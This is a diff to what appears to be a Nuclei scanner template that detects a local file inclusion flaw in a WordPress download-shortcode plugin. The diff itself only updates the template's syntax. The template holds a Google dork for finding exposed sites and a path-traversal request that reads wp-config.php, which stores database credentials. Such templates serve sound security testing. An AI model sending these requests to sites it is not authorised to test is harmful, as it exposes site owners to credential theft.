@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: shortcode-lfi
 info:
   name: WordPress Plugin Download Shortcode Local File Inclusion (0.2.3)
@@ -8,7 +9,7 @@ info:
   metadata:
     google-dork: inurl:wp/wp-content/force-download.php
   tags: wordpress,wp-plugin,lfi,shortcode,wp
-requests:
+http:
   - method: GET
     path:
       - '{{BaseURL}}/wp-content/force-download.php?file=../wp-config.php'
